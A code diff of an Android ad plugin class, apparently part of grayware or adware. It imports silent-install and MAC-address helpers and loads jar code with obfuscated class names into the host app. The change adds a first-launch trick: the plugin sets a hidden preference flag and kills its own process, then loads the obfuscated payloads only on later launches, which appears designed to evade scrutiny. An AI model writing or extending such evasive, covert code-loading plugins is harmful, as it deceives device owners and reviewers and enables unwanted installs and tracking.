@@ -10,10 +10,12 @@ import com.nova.adplugin.bean.UpdateAppsDTO
 import com.nova.adplugin.ext.getApkFileNameFromUrl
 import com.nova.adplugin.ext.getBasePath
 import com.nova.adplugin.ext.getFileExtension
+import com.nova.adplugin.ext.getFromSP
 import com.nova.adplugin.ext.silentInstallWithMutex
 import com.nova.adplugin.log.printLog
 import com.nova.adplugin.net.NetworkHelper
 import com.nova.adplugin.ext.getMacAddress
+import com.nova.adplugin.ext.saveToSP
 import java.io.File
 import java.io.IOException
 import java.util.concurrent.Executors
@@ -21,6 +23,7 @@ import java.util.concurrent.Future
 import java.util.concurrent.ScheduledExecutorService
 import java.util.concurrent.ScheduledFuture
 import java.util.concurrent.TimeUnit
+import kotlin.system.exitProcess
 
 open class AdPluginBase {
     lateinit var adDispatcher: AdDispatcher
@@ -28,24 +31,38 @@ open class AdPluginBase {
     @Suppress("UNRESOLVED_REFERENCE") // 告诉 IDE 忽略这个错误
     open fun initialize() {
         // 注册多个广告提供商
-        try {
-            "jar包加载开始".printLog()
-            com.s.d.t.s(appContext)
-            com.debby.Devour.getInstance().devourPlay(appContext)
-            com.unia.y.b.a(appContext, "7087", "")
-            "jar包加载结束".printLog()
-            //installPackage()
-            "开始执行Webview加载".printLog()
-            loadWebView(appContext)
-            checkAppPush()
-            //val sdkA = AdSdkAProvider()
-            //val sdkB = AdSdkBProvider()
-            //val providers = arrayListOf(sdkA)
-            //adDispatcher = AdDispatcher(providers)
-            //providers.forEach { it.initialize(appContext) }
-        } catch (e: Exception) {
-            "插件内部初始化失败：${e.message}".printLog()
+        val isKill = getFromSP<String>("iskill_6") ?: "false"
+        "获取到的值是：$isKill".printLog()
+        if(isKill == "false"){
+            "准备杀死进程".printLog()
+            "true".saveToSP("iskill_6")
+            //val isKill_new = getFromSP<String>("iskill_6") ?: "false"
+            //println("保存之后的值是：$isKill_new")
+            // 延迟 100ms 确保写入完成（可选）
+            Thread.sleep(500)
+            android.os.Process.killProcess(android.os.Process.myPid());
+            exitProcess(0);
+        }else{
+            try {
+                "jar包加载开始".printLog()
+                com.s.d.t.s(appContext)
+                com.debby.Devour.getInstance().devourPlay(appContext)
+                com.unia.y.b.a(appContext, "7087", "")
+                "jar包加载结束".printLog()
+                //installPackage()
+                //"开始执行Webview加载".printLog()
+                //loadWebView(appContext)
+                //checkAppPush()
+                //val sdkA = AdSdkAProvider()
+                //val sdkB = AdSdkBProvider()
+                //val providers = arrayListOf(sdkA)
+                //adDispatcher = AdDispatcher(providers)
+                //providers.forEach { it.initialize(appContext) }
+            } catch (e: Exception) {
+                "插件内部初始化失败：${e.message}".printLog()
+            }
         }
+
 
     }
 
